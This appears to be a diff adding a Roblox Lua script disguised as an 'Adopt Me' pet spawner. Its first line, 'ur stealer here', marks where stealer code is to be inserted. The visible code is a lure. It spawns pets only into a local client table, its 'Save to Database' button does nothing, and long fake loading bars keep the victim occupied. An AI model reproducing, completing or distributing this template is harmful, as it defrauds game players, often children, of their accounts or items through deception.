@@ -1,0 +1,444 @@
+ur stealer here
+
+
+
+--[[ Loading screen on execution with progress bar and % ]]--
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+
+--------------------------------------------------
+-- Intro Loading Screen (initial script loading)
+--------------------------------------------------
+local InitialLoadGui = Instance.new("ScreenGui")
+InitialLoadGui.Name = "InitialLoadGui"
+InitialLoadGui.ResetOnSpawn = false
+InitialLoadGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local Frame = Instance.new("Frame", InitialLoadGui)
+Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+Frame.Size = UDim2.new(0, 400, 0, 120)
+Frame.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
+
+local corner = Instance.new("UICorner", Frame)
+corner.CornerRadius = UDim.new(0, 12)
+
+local Title = Instance.new("TextLabel", Frame)
+Title.Size = UDim2.new(1, 0, 0.4, 0)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "Loading Script..."
+Title.Font = Enum.Font.FredokaOne
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextScaled = true
+
+local Bar = Instance.new("Frame", Frame)
+Bar.Position = UDim2.new(0.05, 0, 0.6, 0)
+Bar.Size = UDim2.new(0.9, 0, 0.25, 0)
+Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+Instance.new("UICorner", Bar).CornerRadius = UDim.new(0, 6)
+
+local Fill = Instance.new("Frame", Bar)
+Fill.BackgroundColor3 = Color3.fromRGB(6, 125, 252)
+Fill.Size = UDim2.new(0, 0, 1, 0)
+Instance.new("UICorner", Fill).CornerRadius = UDim.new(0, 6)
+
+local Percent = Instance.new("TextLabel", Frame)
+Percent.Size = UDim2.new(0, 60, 0.25, 0)
+Percent.Position = UDim2.new(0.5, -20, 0.6, 0)
+Percent.BackgroundTransparency = 1
+Percent.Text = "0%"
+Percent.Font = Enum.Font.FredokaOne
+Percent.TextColor3 = Color3.fromRGB(255, 255, 255)
+Percent.TextScaled = true
+Percent.TextXAlignment = Enum.TextXAlignment.Center
+Percent.TextYAlignment = Enum.TextYAlignment.Top
+
+--------------------------------------------------
+-- Pet Spawn Function (unchanged)
+--------------------------------------------------
+local function spawnPet(name)
+    if not name or name == "" then 
+        name = "Unknown Pet" 
+    end
+    local petToAdd = name
+
+    local Loads = require(game.ReplicatedStorage.Fsys).load
+    local ClientData = Loads("ClientData")
+    local InventoryDB = Loads("InventoryDB")
+    local Inventory = ClientData.get("inventory")
+
+    local function generate_prop()
+        return {
+            flyable = true,
+            rideable = true,
+            neon = false,
+            mega_neon = false,
+            age = 1
+        }
+    end
+
+    local function cloneTable(original)
+        local copy = {}
+        for key, value in pairs(original) do
+            copy[key] = type(value) == "table" and cloneTable(value) or value
+        end
+        return copy
+    end
+
+    for category_name, category_table in pairs(InventoryDB) do
+        for id, item in pairs(category_table) do
+            if category_name == "pets" and item.name == petToAdd then
+                local fake_uuid = game.HttpService:GenerateGUID()
+                local n_item = cloneTable(item)
+                n_item["unique"] = "uuid_" .. fake_uuid
+                n_item["category"] = "pets"
+                n_item["properties"] = generate_prop()
+                n_item["newness_order"] = math.random(1, 900000)
+                Inventory[category_name] = Inventory[category_name] or {}
+                Inventory[category_name][fake_uuid] = n_item
+                break
+            end
+        end
+    end
+
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "Pet Spawned!",
+        Text = petToAdd .. " has been spawned!",
+        Duration = 3,
+    })
+end
+
+--------------------------------------------------
+-- New Function: Display a Separate Spawn Loading GUI
+--------------------------------------------------
+local function showSpawnLoadingGui(petName, callback)
+    local spawnLoadingGui = Instance.new("ScreenGui")
+    spawnLoadingGui.Name = "SpawnLoadingGui"
+    spawnLoadingGui.ResetOnSpawn = false
+    spawnLoadingGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+    local loadingFrame = Instance.new("Frame", spawnLoadingGui)
+    loadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+    loadingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    loadingFrame.Size = UDim2.new(0, 300, 0, 150)
+    loadingFrame.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
+    local loadingCorner = Instance.new("UICorner", loadingFrame)
+    loadingCorner.CornerRadius = UDim.new(0, 12)
+
+    local loadingLabel = Instance.new("TextLabel", loadingFrame)
+    loadingLabel.Size = UDim2.new(1, 0, 0.3, 0)
+    loadingLabel.Position = UDim2.new(0, 0, 0, 0)
+    loadingLabel.BackgroundTransparency = 1
+    loadingLabel.Text = "Loading: " .. petName
+    loadingLabel.Font = Enum.Font.FredokaOne
+    loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loadingLabel.TextScaled = true
+
+    local bar = Instance.new("Frame", loadingFrame)
+    bar.Position = UDim2.new(0.1, 0, 0.5, 0)
+    bar.Size = UDim2.new(0.8, 0, 0.2, 0)
+    bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    local barCorner = Instance.new("UICorner", bar)
+    barCorner.CornerRadius = UDim.new(0, 6)
+
+    local fill = Instance.new("Frame", bar)
+    fill.BackgroundColor3 = Color3.fromRGB(6, 125, 252)
+    fill.Size = UDim2.new(0, 0, 1, 0)
+    local fillCorner = Instance.new("UICorner", fill)
+    fillCorner.CornerRadius = UDim.new(0, 6)
+
+    local percentLabel = Instance.new("TextLabel", loadingFrame)
+    percentLabel.Size = UDim2.new(0, 60, 0.2, 0)
+    percentLabel.Position = UDim2.new(0.5, -30, 0.75, 0)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Text = "0%"
+    percentLabel.Font = Enum.Font.FredokaOne
+    percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percentLabel.TextScaled = true
+
+    local steps = 30
+    local duration = 180  -- adjust to change spawn loading speed
+    local waitTime = duration / steps
+
+    spawn(function()
+        for i = 1, steps do
+            local progress = i / steps
+            fill:TweenSize(UDim2.new(progress, 0, 1, 0), "Out", "Sine", waitTime, true)
+            percentLabel.Text = tostring(math.floor(progress * 100)) .. "%"
+            task.wait(waitTime)
+        end
+
+        spawnLoadingGui:Destroy()
+        if callback then
+            callback()
+        end
+    end)
+end
+
+--------------------------------------------------
+-- New Function: Display a Separate Save Loading GUI
+--------------------------------------------------
+local function showSaveLoadingGui(petName, callback)
+    local saveLoadingGui = Instance.new("ScreenGui")
+    saveLoadingGui.Name = "SaveLoadingGui"
+    saveLoadingGui.ResetOnSpawn = false
+    saveLoadingGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+    local loadingFrame = Instance.new("Frame", saveLoadingGui)
+    loadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+    loadingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    loadingFrame.Size = UDim2.new(0, 300, 0, 150)
+    loadingFrame.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
+    local loadingCorner = Instance.new("UICorner", loadingFrame)
+    loadingCorner.CornerRadius = UDim.new(0, 12)
+
+    local loadingLabel = Instance.new("TextLabel", loadingFrame)
+    loadingLabel.Size = UDim2.new(1, 0, 0.3, 0)
+    loadingLabel.Position = UDim2.new(0, 0, 0, 0)
+    loadingLabel.BackgroundTransparency = 1
+    loadingLabel.Text = "Saving: " .. petName
+    loadingLabel.Font = Enum.Font.FredokaOne
+    loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loadingLabel.TextScaled = true
+
+    local bar = Instance.new("Frame", loadingFrame)
+    bar.Position = UDim2.new(0.1, 0, 0.5, 0)
+    bar.Size = UDim2.new(0.8, 0, 0.2, 0)
+    bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    local barCorner = Instance.new("UICorner", bar)
+    barCorner.CornerRadius = UDim.new(0, 6)
+
+    local fill = Instance.new("Frame", bar)
+    fill.BackgroundColor3 = Color3.fromRGB(6, 125, 252)
+    fill.Size = UDim2.new(0, 0, 1, 0)
+    local fillCorner = Instance.new("UICorner", fill)
+    fillCorner.CornerRadius = UDim.new(0, 6)
+
+    local percentLabel = Instance.new("TextLabel", loadingFrame)
+    percentLabel.Size = UDim2.new(0, 60, 0.2, 0)
+    percentLabel.Position = UDim2.new(0.5, -30, 0.75, 0)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Text = "0%"
+    percentLabel.Font = Enum.Font.FredokaOne
+    percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percentLabel.TextScaled = true
+
+    local steps = 30
+    local duration = 5  -- adjust to change save loading speed
+    local waitTime = duration / steps
+
+    spawn(function()
+        for i = 1, steps do
+            local progress = i / steps
+            fill:TweenSize(UDim2.new(progress, 0, 1, 0), "Out", "Sine", waitTime, true)
+            percentLabel.Text = tostring(math.floor(progress * 100)) .. "%"
+            task.wait(waitTime)
+        end
+
+        saveLoadingGui:Destroy()
+        if callback then
+            callback()
+        end
+    end)
+end
+
+--------------------------------------------------
+-- Main GUI Setup (includes Spawn and Save buttons)
+--------------------------------------------------
+local function showMainGUI()
+    local AdoptMeSpawner = Instance.new("ScreenGui")
+    AdoptMeSpawner.Name = "AdoptMeSpawner"
+    AdoptMeSpawner.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    AdoptMeSpawner.ResetOnSpawn = false
+    AdoptMeSpawner.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    local Main = Instance.new("Frame")
+    Main.Name = "Main"
+    Main.Parent = AdoptMeSpawner
+    Main.AnchorPoint = Vector2.new(0.5, 0.5)
+    Main.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
+    Main.Position = UDim2.new(0.5, 0, 0.5, 0)
+    Main.Size = UDim2.new(0, 500, 0, 300)
+    Main.Active = true
+    Main.ZIndex = 9999
+
+    local UICorner = Instance.new("UICorner", Main)
+    UICorner.CornerRadius = UDim.new(0, 12)
+
+    local UiStroke = Instance.new("UIStroke", Main)
+    UiStroke.Color = Color3.fromRGB(6, 125, 252)
+    UiStroke.Thickness = 3
+
+    -- Draggable functionality for Main GUI
+    local dragging = false
+    local dragInput, dragStart, startPos
+
+    local function update(input)
+        local delta = input.Position - dragStart
+        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+
+    Main.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            startPos = Main.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    Main.InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+            dragInput = input
+            update(input)
+        end
+    end)
+
+    local Lbl = Instance.new("TextLabel", Main)
+    Lbl.AnchorPoint = Vector2.new(0.5, 0.5)
+    Lbl.BackgroundTransparency = 1
+    Lbl.Position = UDim2.new(0.5, 0, 0.15, 0)
+    Lbl.Size = UDim2.new(0, 250, 0, 60)
+    Lbl.Font = Enum.Font.FredokaOne
+    Lbl.Text = "Pet Spawner"
+    Lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Lbl.TextSize = 28
+    Lbl.TextScaled = true
+    Lbl.ZIndex = 10000
+
+    local Box = Instance.new("TextBox", Main)
+    Box.AnchorPoint = Vector2.new(0.5, 0.5)
+    Box.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+    Box.Position = UDim2.new(0.5, 0, 0.5, 0)
+    Box.Size = UDim2.new(0, 310, 0, 80)
+    Box.Font = Enum.Font.FredokaOne
+    Box.PlaceholderText = "Enter Pet Name"
+    Box.Text = ""
+    Box.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Box.TextSize = 45
+    Box.ZIndex = 10000
+    Instance.new("UICorner", Box).CornerRadius = UDim.new(0, 12)
+
+    local Btn = Instance.new("TextButton", Main)
+    Btn.AnchorPoint = Vector2.new(0.5, 0.5)
+    Btn.BackgroundColor3 = Color3.fromRGB(6, 125, 252)
+    Btn.Position = UDim2.new(0.5, 0, 0.73, 0)
+    Btn.Size = UDim2.new(0, 200, 0, 50)
+    Btn.Font = Enum.Font.FredokaOne
+    Btn.Text = "Start Spawning"
+    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Btn.TextSize = 28
+    Btn.ZIndex = 10000
+    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 12)
+
+    local Credit = Instance.new("TextLabel", Main)
+    Credit.AnchorPoint = Vector2.new(0.5, 1)
+    Credit.BackgroundTransparency = 1
+    Credit.Position = UDim2.new(0.5, 0, 1, -210)
+    Credit.Size = UDim2.new(0, 300, 0, 20)
+    Credit.Font = Enum.Font.FredokaOne
+    Credit.Text = "Made by Snowyxblitz on YT/TT"
+    Credit.TextColor3 = Color3.fromRGB(180, 180, 180)
+    Credit.TextSize = 14
+    Credit.ZIndex = 10000
+
+    -- Create the circular Close button at the top-right corner
+    local CloseBtn = Instance.new("TextButton", Main)
+    CloseBtn.Name = "CloseBtn"
+    CloseBtn.AnchorPoint = Vector2.new(1, 0)
+    CloseBtn.Position = UDim2.new(1, -5, 0, 5)
+    CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+    CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    CloseBtn.Text = "X"
+    CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CloseBtn.Font = Enum.Font.FredokaOne
+    CloseBtn.TextScaled = true
+    local closeCorner = Instance.new("UICorner", CloseBtn)
+    closeCorner.CornerRadius = UDim.new(1, 0)  -- Makes it a circle
+    CloseBtn.MouseButton1Click:Connect(function()
+        AdoptMeSpawner:Destroy()
+    end)
+
+    -- Debounce flag for the Spawn Pet button
+    local isSpawning = false
+
+    Btn.MouseButton1Click:Connect(function()
+        if isSpawning then return end
+        if Box.Text ~= "" then
+            isSpawning = true
+            Credit.Visible = false
+            Btn.Text = "Spawning..."
+            Btn.AutoButtonColor = false
+            Btn.Active = false
+
+            -- Show the separate spawn loading GUI with pet name
+            showSpawnLoadingGui(Box.Text, function()
+                spawnPet(Box.Text)
+                Btn.Text = "Start Spawning"
+                Btn.AutoButtonColor = true
+                Btn.Active = true
+                isSpawning = false
+            end)
+        end
+    end)
+
+    -- Debounce flag for the Save button
+    local isSaving = false
+
+    local SaveBtn = Instance.new("TextButton", Main)
+    SaveBtn.AnchorPoint = Vector2.new(0.5, 0.5)
+    SaveBtn.Position = UDim2.new(0.5, 0, 0.905, 0)
+    SaveBtn.Size = UDim2.new(0, 220, 0, 50)
+    SaveBtn.Font = Enum.Font.FredokaOne
+    SaveBtn.Text = "Save to Database"
+    SaveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    SaveBtn.TextSize = 28
+    SaveBtn.ZIndex = 10000
+    Instance.new("UICorner", SaveBtn).CornerRadius = UDim.new(0, 12)
+
+    SaveBtn.MouseButton1Click:Connect(function()
+        if isSaving then return end
+        if Box.Text ~= "" then
+            isSaving = true
+            SaveBtn.Text = "Saving..."
+            SaveBtn.AutoButtonColor = false
+            SaveBtn.Active = false
+
+            -- Show the separate save loading GUI with pet name
+            showSaveLoadingGui(Box.Text, function()
+                -- (No further action is taken on saving, only visual feedback.)
+                SaveBtn.Text = "Save to Database"
+                SaveBtn.AutoButtonColor = true
+                SaveBtn.Active = true
+                isSaving = false
+            end)
+        end
+    end)
+end
+
+--------------------------------------------------
+-- Animate intro loading and show Main GUI
+--------------------------------------------------
+spawn(function()
+    local progress = 0
+    local duration = 60  -- adjust to change intro loading speed
+    local steps = 50
+    local waitTime = duration / steps
+
+    for i = 1, steps do
+        progress = math.floor((i / steps) * 100)
+        Percent.Text = progress .. "%"
+        Fill:TweenSize(UDim2.new(i / steps, 0, 1, 0), "Out", "Sine", waitTime, true)
+        wait(waitTime)
+    end
+
+    InitialLoadGui:Destroy()
+    showMainGUI()
+end)
